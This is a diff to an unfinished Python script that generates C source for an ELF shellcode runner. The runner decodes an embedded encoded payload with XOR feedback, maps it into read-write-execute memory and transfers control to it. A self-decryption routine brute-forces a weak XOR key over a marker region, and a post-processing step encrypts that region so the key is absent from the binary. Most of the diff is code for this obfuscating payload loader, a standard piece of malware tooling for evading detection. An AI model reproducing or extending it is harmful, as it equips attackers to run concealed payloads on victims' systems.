@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 # WIP WIP WIP WIP WIP WIP WIP WIP WIP WIP
+
 import argparse
 import os
 import subprocess
@@ -53,20 +54,21 @@ def generate_runner_c(encoded_payload, arch, decoder_key):
     
     This runner embeds:
       - The encoded payload as a global array.
-      - The decoder key (a 64-bit constant for x64).
-      - A decoder routine (decode_payload) that processes the payload in 8-byte blocks.
-      - A self‑decryption routine (self_decrypt_region) that brute‑forces a weak XOR key
-        over a contiguous marker region.
+      - The decoder key (a 64-bit constant for x64; adjust as needed for x32).
+      - A decoder routine (decode_payload) that processes the payload in BLOCK_SIZE-byte chunks.
+      - A self‑decryption routine (self_decrypt_region) that brute‑forces the weak XOR key
+        (0x42) over a contiguous marker region.
       
-    The marker region is defined as a single global string placed in the writable data section
-    (to allow modification). It contains "DECO_START" immediately followed by "DECO_END". Macros
-    define the start, expected marker, and end pointers.
+    The marker region is defined as a single global string placed in writable memory
+    (in the .data section) and contains "DECO_START" immediately followed by "DECO_END".
+    A separate constant expected_marker is defined as "DECO" (the first four characters)
+    so that self_decrypt_region can compare the decrypted bytes against the expected value.
       
     At runtime, runner_entry() first calls self_decrypt_region() to decrypt the marker region,
-    then allocates executable memory, copies the encoded payload there, decodes it using decode_payload(),
-    flushes the instruction cache, and finally transfers control.
+    then allocates executable memory, copies the encoded payload there, decodes it using
+    decode_payload(), flushes the instruction cache, and transfers control.
       
-    The postprocess step XOR‑encrypts the bytes between "DECO_START" and "DECO_END" with 0x42.
+    The postprocess step will XOR‑encrypt the bytes between "DECO_START" and "DECO_END" with 0x42.
     """
     c_code = f'''\
 #include <stdio.h>
@@ -80,10 +82,13 @@ def generate_runner_c(encoded_payload, arch, decoder_key):
 
 // Place the marker region in the writable .data section.
 __attribute__((section(".data"))) char __decrypt_region[] = "DECO_STARTDECO_END";
-// Macros to define pointers within the marker region.
+
+// Define macros for the marker region.
 #define __decrypt_start (__decrypt_region)
-#define __decrypt_marker (__decrypt_region)  // We expect the first 4 bytes ("DECO") after decryption.
 #define __decrypt_end (__decrypt_region + sizeof(__decrypt_region) - 1)
+
+// The expected marker (plaintext) for verification.
+const char expected_marker[] = "DECO";
 
 // The decoder key from the encoder.
 unsigned long long decoder_key = 0x{decoder_key:016x};
@@ -93,7 +98,7 @@ extern unsigned char encoded_payload[];
 extern size_t payload_size;
 
 // Decoder routine for the encoded payload.
-// Processes the payload in BLOCK_SIZE-byte chunks using XOR additive feedback.
+// It processes the payload in BLOCK_SIZE-byte chunks using XOR additive feedback.
 void decode_payload(unsigned char *data, size_t size, unsigned long long key) {{
     unsigned long long k = key;
     for (size_t i = 0; i < size; i += BLOCK_SIZE) {{
@@ -106,8 +111,9 @@ void decode_payload(unsigned char *data, size_t size, unsigned long long key) {{
 }}
 
 // Self-decryption routine for the runner's marker region.
-// Brute-forces the XOR key (0–255) over the region from __decrypt_start to __decrypt_end
-// until the first 4 bytes decrypt to "DECO". Uses dynamic allocation.
+// It brute-forces the XOR key (0-255) over the region from __decrypt_start to __decrypt_end
+// until the first 4 bytes decrypt to the expected marker ("DECO").
+// Uses dynamic allocation to avoid large stack usage.
 void self_decrypt_region() {{
     unsigned char *start = (unsigned char *)__decrypt_start;
     unsigned char *end = (unsigned char *)__decrypt_end;
@@ -123,7 +129,7 @@ void self_decrypt_region() {{
         for (size_t i = 0; i < region_size; i++) {{
             temp[i] ^= key;
         }}
-        if (memcmp(temp, __decrypt_marker, 4) == 0) {{
+        if (memcmp(temp, expected_marker, 4) == 0) {{
             for (size_t i = 0; i < region_size; i++) {{
                 start[i] ^= key;
             }}
@@ -137,8 +143,9 @@ void self_decrypt_region() {{
 }}
 
 // Runner entry function.
-// Self-decrypts the marker region, allocates executable memory,
-// copies the encoded payload, decodes it, clears the instruction cache, and transfers control.
+// It first self-decrypts the marker region, then allocates executable memory,
+// copies the encoded payload, decodes it using decode_payload(), clears the instruction cache,
+// and transfers control to the decoded payload.
 void runner_entry() {{
     self_decrypt_region();
     void *exec_mem = mmap(NULL, payload_size, PROT_READ | PROT_WRITE | PROT_EXEC,
@@ -194,9 +201,9 @@ def postprocess_runner(runner_filename):
     """
     Post-process the compiled ELF runner.
     
-    Opens the runner binary, locates the region between the marker strings "DECO_START" and "DECO_END",
-    and XOR-encrypts that region with the weak key (0x42). The final ELF will not include the key;
-    at runtime the runner will brute-force it.
+    This function opens the runner binary, locates the region between the marker strings
+    "DECO_START" and "DECO_END", and XOR-encrypts that region with the weak key (0x42).
+    The final ELF will not include the decryption key; at runtime the runner will brute-force it.
     """
     with open(runner_filename, "rb") as f:
         data = bytearray(f.read())
